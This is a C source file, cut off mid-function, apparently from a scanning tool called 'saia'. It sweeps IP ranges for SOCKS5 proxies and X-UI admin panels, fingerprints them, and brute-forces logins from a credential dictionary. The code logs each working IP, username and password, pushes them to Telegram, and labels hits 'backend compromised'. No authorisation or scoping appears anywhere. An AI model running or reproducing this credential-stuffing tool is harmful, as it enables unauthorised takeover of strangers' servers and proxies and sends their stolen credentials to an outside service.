#include "saia.h"

static volatile int running_threads = 0;
static volatile int verify_running_threads = 0;
static volatile int feeding_in_progress = 0;
static volatile int pending_verify_tasks = 0;
static char progress_token[512] = "-";

typedef struct verify_task_s {
    char ip[64];
    uint16_t port;
    credential_t *creds;
    size_t cred_count;
    int work_mode;
    int xui_fingerprint_ok;
    int s5_fingerprint_ok;
    int s5_method;
    struct verify_task_s *next;
} verify_task_t;

static verify_task_t *verify_head = NULL;
static verify_task_t *verify_tail = NULL;
#ifdef _WIN32
static HANDLE lock_stats;
static HANDLE lock_file;
#define MUTEX_LOCK(x) WaitForSingleObject(x, INFINITE)
#define MUTEX_UNLOCK(x) ReleaseMutex(x)
#define MUTEX_INIT(x) x = CreateMutex(NULL, FALSE, NULL)
#else
static pthread_mutex_t lock_stats = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t lock_file = PTHREAD_MUTEX_INITIALIZER;
#define MUTEX_LOCK(x) pthread_mutex_lock(&x)
#define MUTEX_UNLOCK(x) pthread_mutex_unlock(&x)
#define MUTEX_INIT(x) // Static init is enough
#endif

#ifdef _WIN32
#define SAIA_STRTOK_R strtok_s
#else
#define SAIA_STRTOK_R strtok_r
#endif

static int clamp_positive_threads(int threads) {
    return (threads > 0) ? threads : 1;
}

static int verify_reserved_threads(void) {
    int total = clamp_positive_threads(g_config.threads);
    int reserve = (total * 30 + 99) / 100; /* ceil(total * 0.3) */
    if (reserve < 1) reserve = 1;
    if (reserve > total) reserve = total;
    return reserve;
}

static void scanner_set_progress_token(const char *ip, uint16_t port, const char *user, const char *pass) {
    char buf[512];
    if (user && pass && *user && *pass) {
        snprintf(buf, sizeof(buf), "%s:%d -> %s:%s", ip ? ip : "-", (int)port, user, pass);
    } else {
        snprintf(buf, sizeof(buf), "%s:%d", ip ? ip : "-", (int)port);
    }
    MUTEX_LOCK(lock_stats);
    snprintf(progress_token, sizeof(progress_token), "%s", buf);
    MUTEX_UNLOCK(lock_stats);
}

// 初始化锁
void init_locks() {
    #ifdef _WIN32
    MUTEX_INIT(lock_stats);
    MUTEX_INIT(lock_file);
    #endif
}

// ==================== 验证逻辑: SOCKS5 ====================

int verify_socks5(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int fd = socket_create(0);
    if (fd < 0) return 0;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (socket_connect_timeout(fd, (struct sockaddr*)&addr, sizeof(addr), timeout_ms) != 0) {
        socket_close(fd);
        return 0;
    }
    
    // 1. 初始握手
    char handshake[] = {0x05, 0x01, 0x00}; // 无认证
    if (user && pass && strlen(user) > 0 && strcmp(user, "-") != 0) {
        handshake[2] = 0x02; // 用户名密码认证
    }
    
    if (socket_send_all(fd, handshake, sizeof(handshake), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }
    
    char resp[2];
    if (socket_recv_until(fd, resp, 2, NULL, timeout_ms) != 2) {
        socket_close(fd);
        return 0;
    }
    
    if (resp[0] != 0x05) {
        socket_close(fd);
        return 0;
    }
    
    // 2. 认证 (如果需要)
    if (resp[1] == 0x02) {
        if (!user || !pass || strcmp(user, "-") == 0) {
            socket_close(fd);
            return 0;
        }
        
        char auth_buf[600]; 
        int ulen = (int)strlen(user);
        int plen = (int)strlen(pass);
        if (ulen > 255) ulen = 255;
        if (plen > 255) plen = 255;
        int idx = 0;
        
        auth_buf[idx++] = 0x01; // Version
        auth_buf[idx++] = (char)ulen;
        memcpy(auth_buf + idx, user, ulen); idx += ulen;
        auth_buf[idx++] = (char)plen;
        memcpy(auth_buf + idx, pass, plen); idx += plen;
        
        if (socket_send_all(fd, auth_buf, idx, timeout_ms) < 0) {
            socket_close(fd);
            return 0;
        }
        
        char auth_resp[2];
        if (socket_recv_until(fd, auth_resp, 2, NULL, timeout_ms) != 2) {
            socket_close(fd);
            return 0;
        }
        
        if (auth_resp[1] != 0x00) { // 认证失败
            socket_close(fd);
            return 0;
        }
    } else if (resp[1] != 0x00) {
        socket_close(fd);
        return 0; // 不支持的认证方法
    }
    
    // 3. 发送CONNECT请求到 1.1.1.1:80 (Cloudflare) 进行 L7 穿透测试
    char connect_req[] = {
        0x05, 0x01, 0x00, 0x01, // VER, CMD, RSV, ATYP(IPv4)
        0x01, 0x01, 0x01, 0x01, // 1.1.1.1
        0x00, 0x50              // Port 80
    };
    
    if (socket_send_all(fd, connect_req, sizeof(connect_req), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }
    
    char conn_resp[10];
    if (socket_recv_until(fd, conn_resp, 10, NULL, timeout_ms) < 4) {
        socket_close(fd);
        return 0;
    }
    
    if (conn_resp[1] != 0x00) {
        socket_close(fd);
        return 0; // 连接被代理拒绝
    }
    
    // 4. 发起 L7 HTTP GET 请求，确认是否真实代理成功
    const char *http_req = "GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: curl/7.88.1\r\nConnection: close\r\n\r\n";
    if (socket_send_all(fd, http_req, strlen(http_req), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }

    char http_resp[1024];
    int n = socket_recv_until(fd, http_resp, sizeof(http_resp) - 1, NULL, timeout_ms);
    socket_close(fd);

    if (n > 0) {
        http_resp[n] = '\0';
        // 只要收到任何合法 HTTP 响应就认为代理真实有效
        if (strstr(http_resp, "HTTP/1.1") || strstr(http_resp, "HTTP/1.0") ||
            strstr(http_resp, "cloudflare") || strstr(http_resp, "Cloudflare") ||
            strstr(http_resp, "301") || strstr(http_resp, "200") ||
            strstr(http_resp, "302") || strstr(http_resp, "403")) {
            return 1;
        }
    }
    return 0; // L7 返回特征不匹配，可能是伪造的 S5
}

// ==================== 验证逻辑: XUI ====================

// ==================== 验证逻辑: XUI ====================

int verify_xui(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/login", ip, port);
    
    char data[512];
    snprintf(data, sizeof(data), "username=%s&password=%s", user, pass);
    
    http_response_t *res = http_post(url, data, timeout_ms);
    if (!res) return 0;
    
    int success = 0;
    
    // 检查响应
    if (res->status_code == 200) {
        // 检查是否有 success: true 或者 Set-Cookie 即可认为是有效面板
        if (res->body && strstr(res->body, "\"success\":true")) {
            success = 1;
        } else if (res->headers && strstr(res->headers, "Set-Cookie")) {
            success = 1;
        } else if (res->body && strstr(res->body, "X-UI")) {
            // 有些旧版本即使返回了200，账号密码不对也能看到登录页特征，需要谨慎
            // 但如果带Set-Cookie基本确真
        }
    }
    
    http_response_free(res);
    return success;
}

// ==================== 多线程调度 ====================

// 线程参数
typedef struct {
    char ip[64];
    uint16_t port;
    credential_t *creds;
    size_t cred_count;
    int work_mode;
    int xui_fingerprint_ok;
    int s5_fingerprint_ok;
    int s5_method;
} worker_arg_t;

static void scanner_report_found_open(const worker_arg_t *task) {
    if (!task) return;
    char result_line[1024];
    const char *tag = "[PORT_OPEN]";
    const char *detail = "端口开放";

    if (task->work_mode == MODE_S5) {
        if (task->s5_fingerprint_ok > 0) {
            tag = "[S5_FOUND]";
            if (task->s5_method == 0x00) {
                detail = "[节点-可连通] S5-OPEN";
            } else if (task->s5_method == 0x02) {
                detail = "[资产-加密节点] S5-AUTH";
            } else {
                detail = "端口开放 + S5特征命中";
            }
        } else {
            tag = "[PORT_OPEN]";
            detail = "端口开放(无S5特征)";
        }
    } else if (task->work_mode == MODE_DEEP) {
        if (task->xui_fingerprint_ok > 0) {
            tag = "[XUI_FOUND]";
            detail = "端口开放 + XUI特征命中";
        } else if (task->s5_fingerprint_ok > 0) {
            tag = "[S5_FOUND]";
            if (task->s5_method == 0x00) {
                detail = "[节点-可连通] S5-OPEN";
            } else if (task->s5_method == 0x02) {
                detail = "[资产-加密节点] S5-AUTH";
            } else {
                detail = "端口开放 + S5特征命中";
            }
        } else {
            tag = "[PORT_OPEN]";
            detail = "端口开放(无XUI/S5特征)";
        }
    } else if (task->work_mode == MODE_XUI) {
        if (task->xui_fingerprint_ok > 0) {
            tag = "[XUI_FOUND]";
            detail = "端口开放 + XUI特征命中";
        } else {
            tag = "[PORT_OPEN]";
            detail = "端口开放(无XUI特征)";
        }
    }

    snprintf(result_line, sizeof(result_line),
             "%s %s:%d | %s",
             tag, task->ip, task->port, detail);
    MUTEX_LOCK(lock_file);
    file_append(g_config.report_file, result_line);
    file_append(g_config.report_file, "\n");
    printf("\n%s%s%s\n", C_CYAN, result_line, C_RESET);
    MUTEX_UNLOCK(lock_file);
}

static int contains_ci(const char *haystack, const char *needle) {
    if (!haystack || !needle || !*needle) return 0;
    size_t nlen = strlen(needle);
    for (const char *p = haystack; *p; p++) {
        size_t i = 0;
        while (i < nlen && p[i] && tolower((unsigned char)p[i]) == tolower((unsigned char)needle[i])) {
            i++;
        }
        if (i == nlen) return 1;
    }
    return 0;
}

static int xui_has_required_fingerprint(const char *ip, uint16_t port, int timeout_ms) {
    char url_login[256];
    char url_xui[256];
    snprintf(url_login, sizeof(url_login), "http://%s:%d/login", ip, port);
    snprintf(url_xui, sizeof(url_xui), "http://%s:%d/xui/", ip, port);

    int has_form_userpass = 0;
    int has_header_gin = 0;
    int has_path_xui = 0;
    int has_session_cookie = 0;
    int has_json_api = 0;
    int has_login_failed_json = 0;

    http_response_t *r_login = http_get(url_login, timeout_ms);
    if (r_login) {
        if (r_login->headers) {
            if (contains_ci(r_login->headers, "server: gin") || contains_ci(r_login->headers, " gin")) {
                has_header_gin = 1;
            }
            if (contains_ci(r_login->headers, "set-cookie") && contains_ci(r_login->headers, "session")) {
                has_session_cookie = 1;
            }
            if (contains_ci(r_login->headers, "application/json")) {
                has_json_api = 1;
            }
            if (contains_ci(r_login->headers, "/xui/")) {
                has_path_xui = 1;
            }
        }
        if (r_login->body) {
            if ((contains_ci(r_login->body, "username") || contains_ci(r_login->body, "user")) &&
                (contains_ci(r_login->body, "password") || contains_ci(r_login->body, "pass"))) {
                has_form_userpass = 1;
            }
            if (contains_ci(r_login->body, "/xui/")) {
                has_path_xui = 1;
            }
            if (contains_ci(r_login->body, "json") || contains_ci(r_login->body, "\"success\"")) {
                has_json_api = 1;
            }
        }
        http_response_free(r_login);
    }

    http_response_t *r_xui = http_get(url_xui, timeout_ms);
    if (r_xui) {
        if (r_xui->headers && contains_ci(r_xui->headers, "server: gin")) has_header_gin = 1;
        if (r_xui->headers && contains_ci(r_xui->headers, "set-cookie") && contains_ci(r_xui->headers, "session")) has_session_cookie = 1;
        if (r_xui->headers && contains_ci(r_xui->headers, "/xui/")) has_path_xui = 1;
        if (r_xui->body && contains_ci(r_xui->body, "/xui/")) has_path_xui = 1;
        http_response_free(r_xui);
    }

    http_response_t *r_bad = http_post(url_login, "username=saia_probe&password=saia_probe_bad", timeout_ms);
    if (r_bad) {
        if (r_bad->headers && contains_ci(r_bad->headers, "application/json")) {
            has_json_api = 1;
        }
        if (r_bad->body) {
            if (contains_ci(r_bad->body, "\"success\"")) {
                has_json_api = 1;
            }
            if ((contains_ci(r_bad->body, "\"success\":false") || contains_ci(r_bad->body, "\"success\": false") ||
                 contains_ci(r_bad->body, "login-failed") || contains_ci(r_bad->body, "failed")) &&
                (contains_ci(r_bad->body, "json") || contains_ci(r_bad->body, "\"success\""))) {
                has_login_failed_json = 1;
            }
        }
        http_response_free(r_bad);
    }

    if (!has_header_gin) return 0;
    if (!(has_form_userpass || has_path_xui)) return 0;
    if (!(has_json_api || has_login_failed_json)) return 0;

    return 1;
}

static int s5_has_required_fingerprint(const char *ip, uint16_t port, int timeout_ms, int *method_out) {
    int fd = socket_create(0);
    if (fd < 0) return 0;
    if (method_out) *method_out = -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (socket_connect_timeout(fd, (struct sockaddr*)&addr, sizeof(addr), timeout_ms) != 0) {
        socket_close(fd);
        return 0;
    }

    /* 提供 no-auth + user/pass 两种方法，识别标准 SOCKS5 协商回应 */
    char hello[] = {0x05, 0x02, 0x00, 0x02};
    if (socket_send_all(fd, hello, sizeof(hello), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }

    char resp[2];
    int n = socket_recv_until(fd, resp, sizeof(resp), NULL, timeout_ms);
    socket_close(fd);
    if (n != 2) return 0;

    if ((unsigned char)resp[0] != 0x05) return 0;
    if ((unsigned char)resp[1] == 0x00 || (unsigned char)resp[1] == 0x02) {
        if (method_out) *method_out = (int)(unsigned char)resp[1];
        return 1;
    }
    return 0;
}

static void scanner_run_verify_logic(const verify_task_t *task) {
    if (!task) return;

    int xui_fingerprint_ok = task->xui_fingerprint_ok;
    int s5_fingerprint_ok = task->s5_fingerprint_ok;
    int s5_method = task->s5_method;
    if (xui_fingerprint_ok < 0 &&
        (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP || task->work_mode == MODE_VERIFY)) {
        xui_fingerprint_ok = xui_has_required_fingerprint(task->ip, task->port, 3000);
    }

    if (task->work_mode == MODE_S5) {
        if (s5_fingerprint_ok == 0) {
            return;
        }

        int verified = 0;
        for (size_t i = 0; i < task->cred_count; i++) {
            scanner_set_progress_token(task->ip, task->port, task->creds[i].username, task->creds[i].password);
            if (verify_socks5(task->ip, task->port, task->creds[i].username, task->creds[i].password, 3000)) {
                MUTEX_LOCK(lock_stats);
                g_state.total_verified++;
                g_state.s5_verified++;
                MUTEX_UNLOCK(lock_stats);

                char result_line[1024];
                snprintf(result_line, sizeof(result_line),
                         "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s",
                         task->ip, task->port,
                         task->creds[i].username, task->creds[i].password);

                MUTEX_LOCK(lock_file);
                file_append(g_config.report_file, result_line);
                file_append(g_config.report_file, "\n");
                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                MUTEX_UNLOCK(lock_file);

                char msg[1024];
                snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>",
                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
                push_telegram(msg);
                verified = 1;
                break;
            }
        }

        if (!verified) {
            char result_line[1024];
            if (s5_method == 0x02) {
                snprintf(result_line, sizeof(result_line),
                         "[S5_FOUND] [节点-可连通] %s:%d | S5-AUTH | 字典未命中或无L7能力",
                         task->ip, task->port);
            } else {
                snprintf(result_line, sizeof(result_line),
                         "[S5_FOUND] [节点-可连通] %s:%d | S5-OPEN | 无L7能力",
                         task->ip, task->port);
            }
            MUTEX_LOCK(lock_file);
            file_append(g_config.report_file, result_line);
            file_append(g_config.report_file, "\n");
            printf("\n%s%s%s\n", C_CYAN, result_line, C_RESET);
            MUTEX_UNLOCK(lock_file);
        }
        return;
    }

    if (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) {
        if (task->work_mode == MODE_XUI && !xui_fingerprint_ok) {
            return;
        }
        int found = 0;
        for (size_t i = 0; i < task->cred_count && xui_fingerprint_ok; i++) {
            scanner_set_progress_token(task->ip, task->port, task->creds[i].username, task->creds[i].password);
            if (verify_xui(task->ip, task->port,
                           task->creds[i].username, task->creds[i].password, 3000)) {
                MUTEX_LOCK(lock_stats);
                g_state.total_verified++;
                g_state.xui_verified++;
                MUTEX_UNLOCK(lock_stats);

                char result_line[1024];
                snprintf(result_line, sizeof(result_line),
                         "[XUI_VERIFIED] [高危-后台沦陷] %s:%d | 账号:%s | 密码:%s | 登录成功",
                         task->ip, task->port,
                         task->creds[i].username, task->creds[i].password);
                MUTEX_LOCK(lock_file);
                file_append(g_config.report_file, result_line);
                file_append(g_config.report_file, "\n");
                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                MUTEX_UNLOCK(lock_file);

                char msg[1024];
                snprintf(msg, sizeof(msg), "<b>[XUI_VERIFIED] 高危漏洞触发</b>\nURL: <code>http://%s:%d</code>\n账号: <code>%s</code>\n密码: <code>%s</code>",
                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
                push_telegram(msg);

                found = 1;
                break;
            }
        }

        if (task->work_mode == MODE_DEEP && !found) {
            for (size_t i = 0; i < task->cred_count; i++) {
                scanner_set_progress_token(task->ip, task->port, task->creds[i].username, task->creds[i].password);
                if (verify_socks5(task->ip, task->port,
                                  task->creds[i].username, task->creds[i].password, 3000)) {
                    MUTEX_LOCK(lock_stats);
                    g_state.total_verified++;
                    g_state.s5_verified++;
                    MUTEX_UNLOCK(lock_stats);

                    char result_line[1024];
                    snprintf(result_line, sizeof(result_line),
                             "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s",
                             task->ip, task->port,
                             task->creds[i].username, task->creds[i].password);
                    MUTEX_LOCK(lock_file);
                    file_append(g_config.report_file, result_line);
                    file_append(g_config.report_file, "\n");
                    printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                    MUTEX_UNLOCK(lock_file);

                    char msg[1024];
                    snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>",
                             task->ip, task->port, task->creds[i].username, task->creds[i].password);
                    push_telegram(msg);
                    break;
                }
            }
        }
        return;
    }

    if (task->work_mode == MODE_VERIFY) {
        for (size_t i = 0; i < task->cred_count; i++) {
            scanner_set_progress_token(task->ip, task->port, task->creds[i].username, task->creds[i].password);
            int ok = 0;
            if (xui_fingerprint_ok) {
                ok = verify_xui(task->ip, task->port,
                                task->creds[i].username, task->creds[i].password, 3000);
            }
            if (!ok) ok = verify_socks5(task->ip, task->port,
                                         task->creds[i].username, task->creds[i].password, 3000);
            if (ok) {
                MUTEX_LOCK(lock_stats);
                g_state.total_verified++;
                MUTEX_UNLOCK(lock_stats);

                char result_line[1024];
                snprintf(result_line, sizeof(result_line),
                         "[VERIFIED] %s:%d | 账号:%s | 密码:%s",
                         task->ip, task->port,
                         task->creds[i].username, task->creds[i].password);
                MUTEX_LOCK(lock_file);
                file_append(g_config.report_file, result_line);
                file_append(g_config.report_file, "\n");
                printf("\n%s%s%s\n", C_HOT, result_line, C_RESET);
                MUTEX_UNLOCK(lock_file);
                break;
            }
        }
    }
}

static void scanner_enqueue_verify_task(const worker_arg_t *task) {
    if (!task) return;

    verify_task_t *vt = (verify_task_t *)malloc(sizeof(verify_task_t));
    if (!vt) return;
    memset(vt, 0, sizeof(*vt));
    strncpy(vt->ip, task->ip, sizeof(vt->ip) - 1);
    vt->port = task->port;
    vt->creds = task->creds;
    vt->cred_count = task->cred_count;
    vt->work_mode = task->work_mode;
    vt->xui_fingerprint_ok = task->xui_fingerprint_ok;
    vt->s5_fingerprint_ok = task->s5_fingerprint_ok;
    vt->s5_method = task->s5_method;

    MUTEX_LOCK(lock_stats);
    vt->next = NULL;
    if (verify_tail) {
        verify_tail->next = vt;
    } else {
        verify_head = vt;
    }
    verify_tail = vt;
    pending_verify_tasks++;
    MUTEX_UNLOCK(lock_stats);
}

static int scanner_verify_cap_now(int scans_now, int feeding_now) {
    int reserve = verify_reserved_threads();
    if (feeding_now || scans_now > 0) return reserve;
    return clamp_positive_threads(g_config.threads);
}

#ifdef _WIN32
static unsigned __stdcall verify_worker_thread(void *arg) {
#else
static void *verify_worker_thread(void *arg) {
#endif
    verify_task_t *task = (verify_task_t *)arg;
    scanner_run_verify_logic(task);
    free(task);

    MUTEX_LOCK(lock_stats);
    if (verify_running_threads > 0) verify_running_threads--;
    MUTEX_UNLOCK(lock_stats);

#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

static void scanner_pump_verify_workers(void) {
    while (1) {
        verify_task_t *task = NULL;
        int can_start = 0;

        MUTEX_LOCK(lock_stats);
        int total_threads = clamp_positive_threads(g_config.threads);
        int scans_now = running_threads;
        int feeding_now = feeding_in_progress;
        int verify_cap = scanner_verify_cap_now(scans_now, feeding_now);
        int total_running = running_threads + verify_running_threads;

        if (pending_verify_tasks > 0 && verify_head &&
            verify_running_threads < verify_cap &&
            total_running < total_threads) {
            task = verify_head;
            verify_head = verify_head->next;
            if (!verify_head) verify_tail = NULL;
            pending_verify_tasks--;
            verify_running_threads++;
            can_start = 1;
        }
        MUTEX_UNLOCK(lock_stats);

        if (!can_start || !task) break;

#ifdef _WIN32
        uintptr_t tid = _beginthreadex(NULL, 0, verify_worker_thread, task, 0, NULL);
        if (tid == 0) {
            MUTEX_LOCK(lock_stats);
            verify_running_threads--;
            pending_verify_tasks++;
            task->next = verify_head;
            verify_head = task;
            if (!verify_tail) verify_tail = task;
            MUTEX_UNLOCK(lock_stats);
            break;
        }
        CloseHandle((HANDLE)tid);
#else
        pthread_t tid;
        if (pthread_create(&tid, NULL, verify_worker_thread, task) != 0) {
            MUTEX_LOCK(lock_stats);
            verify_running_threads--;
            pending_verify_tasks++;
            task->next = verify_head;
            verify_head = task;
            if (!verify_tail) verify_tail = task;
            MUTEX_UNLOCK(lock_stats);
            break;
        }
        pthread_detach(tid);
#endif
    }
}

// 工作线程函数
#ifdef _WIN32
unsigned __stdcall worker_thread(void *arg) {
#else
void *worker_thread(void *arg) {
#endif
    worker_arg_t *task = (worker_arg_t *)arg;
    // 更新扫描统计
    MUTEX_LOCK(lock_stats);
    g_state.total_scanned++;
    MUTEX_UNLOCK(lock_stats);
    
    // 1. 端口连通性检查
    int fd = socket_create(0);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(task->port);
    inet_pton(AF_INET, task->ip, &addr.sin_addr);
    
    if (socket_connect_timeout(fd, (struct sockaddr*)&addr, sizeof(addr), 1000) != 0) {
        socket_close(fd);
        free(task);
        
        MUTEX_LOCK(lock_stats);
        running_threads--;
        MUTEX_UNLOCK(lock_stats);
        
        #ifdef _WIN32
        return 0;
        #else
        return NULL;
        #endif
    }
    socket_close(fd);

    task->xui_fingerprint_ok = -1;
    if (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP || task->work_mode == MODE_VERIFY) {
        task->xui_fingerprint_ok = xui_has_required_fingerprint(task->ip, task->port, 2000);
    }
    task->s5_fingerprint_ok = -1;
    task->s5_method = -1;
    if (task->work_mode == MODE_S5 || task->work_mode == MODE_DEEP || task->work_mode == MODE_VERIFY) {
        task->s5_fingerprint_ok = s5_has_required_fingerprint(task->ip, task->port, 2000, &task->s5_method);
    }
    
    // 端口开放后，按模式统计“有效命中”（非纯端口开放）
    int service_hit = 0;
    MUTEX_LOCK(lock_stats);
    if (task->work_mode == MODE_S5 && task->s5_fingerprint_ok > 0) {
        service_hit = 1;
        g_state.s5_found++;
    } else if (task->work_mode == MODE_XUI && task->xui_fingerprint_ok > 0) {
        service_hit = 1;
        g_state.xui_found++;
    } else if (task->work_mode == MODE_DEEP) {
        if (task->xui_fingerprint_ok > 0) {
            service_hit = 1;
            g_state.xui_found++;
        }
        if (task->s5_fingerprint_ok > 0) {
            service_hit = 1;
            g_state.s5_found++;
        }
    } else if (task->work_mode == MODE_VERIFY) {
        if (task->xui_fingerprint_ok > 0 || task->s5_fingerprint_ok > 0) {
            service_hit = 1;
        }
    }
    if (service_hit) {
        g_state.total_found++;
    }
    MUTEX_UNLOCK(lock_stats);

    /* scan_mode: 1=探索(只扫描存活), 2=探索+验真, 3=只留极品(只保留验证通过的) */
    int do_verify = (g_config.scan_mode >= SCAN_EXPLORE_VERIFY);

    scanner_report_found_open(task);

    if (do_verify) {
        if (task->work_mode == MODE_S5 && task->s5_fingerprint_ok <= 0) {
            scanner_set_progress_token(task->ip, task->port, "-", "-");
        } else
        if (task->work_mode == MODE_XUI && task->xui_fingerprint_ok <= 0) {
            scanner_set_progress_token(task->ip, task->port, "-", "-");
        } else {
            scanner_enqueue_verify_task(task);
            scanner_pump_verify_workers();
        }
    } else {
        scanner_set_progress_token(task->ip, task->port, "-", "-");
    }

    
    free(task);
    
    MUTEX_LOCK(lock_stats);
    running_threads--;
    MUTEX_UNLOCK(lock_stats);
    
    #ifdef _WIN32
    return 0;
    #else
    return NULL;
    #endif
}

typedef struct {
    credential_t *creds;
    size_t cred_count;
    uint16_t *ports;
    size_t port_count;
    size_t fed_count;
    size_t est_total;
    struct target_set_s *resume_done;
    struct target_set_s *history_done;
    int skipped_resume;
    int skipped_history;
    int enable_resume_skip;
    int enable_history_skip;
    char resume_checkpoint_file[MAX_PATH_LENGTH];
    char history_file[MAX_PATH_LENGTH];
    char progress_file[MAX_PATH_LENGTH];
    char current_ip[64];
    uint16_t current_port;
} feed_context_t;

typedef struct target_node_s {
    char *key;
    struct target_node_s *next;
} target_node_t;

typedef struct target_set_s {
    target_node_t **buckets;
    size_t bucket_count;
    size_t size;
} target_set_t;

static target_set_t g_resume_cache = {0};
static target_set_t g_history_cache = {0};
static int g_skip_cache_ready = 0;
static int g_skip_cache_resume_enabled = 0;
static int g_skip_cache_history_enabled = 0;

static long long file_size_bytes(const char *path) {
    if (!path || !*path) return -1;
    struct stat st;
    if (stat(path, &st) != 0) return -1;
    return (long long)st.st_size;
}

static void write_scan_progress(feed_context_t *ctx, const char *status) {
    if (!ctx || !ctx->progress_file[0]) return;
    char payload[1024];
    MUTEX_LOCK(lock_stats);
    uint64_t scanned = g_state.total_scanned;
    uint64_t found = g_state.total_found;
    int threads_now = running_threads;
    char tk_line[512];
    snprintf(tk_line, sizeof(tk_line), "%s", progress_token[0] ? progress_token : "-");
    MUTEX_UNLOCK(lock_stats);

    snprintf(payload, sizeof(payload),
             "status=%s\n"
             "est_total=%zu\n"
             "fed=%zu\n"
             "scanned=%llu\n"
             "found=%llu\n"
             "audit_ips=%zu\n"
             "threads=%d\n"
             "current_token=%s\n"
             "current_ip=%s\n"
             "current_port=%u\n"
             "updated=%llu\n",
             status ? status : "running",
             ctx->est_total,
             ctx->fed_count,
             (unsigned long long)scanned,
             (unsigned long long)found,
             ctx->fed_count,
             threads_now,
             tk_line,
             ctx->current_ip[0] ? ctx->current_ip : "-",
             (unsigned)ctx->current_port,
             (unsigned long long)get_current_time_ms());

    MUTEX_LOCK(lock_file);
    file_write_all(ctx->progress_file, payload);
    MUTEX_UNLOCK(lock_file);
}

static uint32_t target_hash(const char *s) {
    uint32_t h = 2166136261u;
    while (s && *s) {
        h ^= (uint8_t)*s++;
        h *= 16777619u;
    }
    return h;
}

static int target_set_init(target_set_t *set, size_t bucket_count) {
    if (!set) return -1;
    if (bucket_count < 1024) bucket_count = 1024;
    set->buckets = (target_node_t **)calloc(bucket_count, sizeof(target_node_t *));
    if (!set->buckets) return -1;
    set->bucket_count = bucket_count;
    set->size = 0;
    return 0;
}

static int target_set_contains(target_set_t *set, const char *target) {
    if (!set || !set->buckets || !target || !*target) return 0;
    size_t idx = (size_t)(target_hash(target) % set->bucket_count);
    for (target_node_t *n = set->buckets[idx]; n; n = n->next) {
        if (strcmp(n->key, target) == 0) return 1;
    }
    return 0;
}

/* return: 1 inserted, 0 exists, -1 error */
static int target_set_add(target_set_t *set, const char *target) {
    if (!set || !set->buckets || !target || !*target) return -1;
    size_t idx = (size_t)(target_hash(target) % set->bucket_count);
    for (target_node_t *n = set->buckets[idx]; n; n = n->next) {
        if (strcmp(n->key, target) == 0) return 0;
    }

    target_node_t *n = (target_node_t *)malloc(sizeof(target_node_t));
    if (!n) return -1;
    n->key = strdup(target);
    if (!n->key) {
        free(n);
        return -1;
    }
    n->next = set->buckets[idx];
    set->buckets[idx] = n;
    set->size++;
    return 1;
}

static void target_set_free(target_set_t *set) {
    if (!set || !set->buckets) return;
    for (size_t i = 0; i < set->bucket_count; i++) {
        target_node_t *n = set->buckets[i];
        while (n) {
            target_node_t *next = n->next;
            free(n->key);
            free(n);
            n = next;
        }
    }
    free(set->buckets);
    set->buckets = NULL;
    set->bucket_count = 0;
    set->size = 0;
}

static void load_target_set_file(const char *path, target_set_t *set) {
    if (!path || !*path || !set) return;

    char **lines = NULL;
    size_t lc = 0;
    if (file_read_lines(path, &lines, &lc) != 0 || !lines) return;

    const size_t max_load = 200000;
    for (size_t i = 0; i < lc && i < max_load; i++) {
        char *line = lines[i] ? str_trim(lines[i]) : NULL;
        if (line && *line) {
            (void)target_set_add(set, line);
        }
        free(lines[i]);
    }
    for (size_t i = (lc < max_load ? lc : max_load); i < lc; i++) {
        free(lines[i]);
    }
    free(lines);
}

static int feed_single_target(const char *ip, void *userdata) {
    feed_context_t *ctx = (feed_context_t *)userdata;
    if (!ip || !*ip || !ctx) return 0;

    strncpy(ctx->current_ip, ip, sizeof(ctx->current_ip) - 1);
    ctx->current_ip[sizeof(ctx->current_ip) - 1] = '\0';

    if (ctx->enable_resume_skip && target_set_contains(ctx->resume_done, ip)) {
        ctx->skipped_resume++;
        return 0;
    }
    if (ctx->enable_history_skip && target_set_contains(ctx->history_done, ip)) {
        ctx->skipped_history++;
        return 0;
    }

    for (size_t p = 0; p < ctx->port_count && g_running && !g_reload; p++) {
        ctx->current_port = ctx->ports[p];
        while (g_running && !g_reload) {
            scanner_pump_verify_workers();

            if (g_config.backpressure.enabled) {
                backpressure_update(&g_config.backpressure);
                if (backpressure_should_throttle(&g_config.backpressure)) {
                    saia_sleep(200);
                    continue;
                }
            }

            MUTEX_LOCK(lock_stats);
            int cur = running_threads + verify_running_threads;
            MUTEX_UNLOCK(lock_stats);
            if (cur < clamp_positive_threads(g_config.threads)) break;
            saia_sleep(5);
        }
        if (!g_running || g_reload) break;

        worker_arg_t *arg = (worker_arg_t *)malloc(sizeof(worker_arg_t));
        if (!arg) continue;
        strncpy(arg->ip, ip, sizeof(arg->ip) - 1);
        arg->ip[sizeof(arg->ip) - 1] = '\0';
        arg->port = ctx->ports[p];
        arg->creds = ctx->creds;
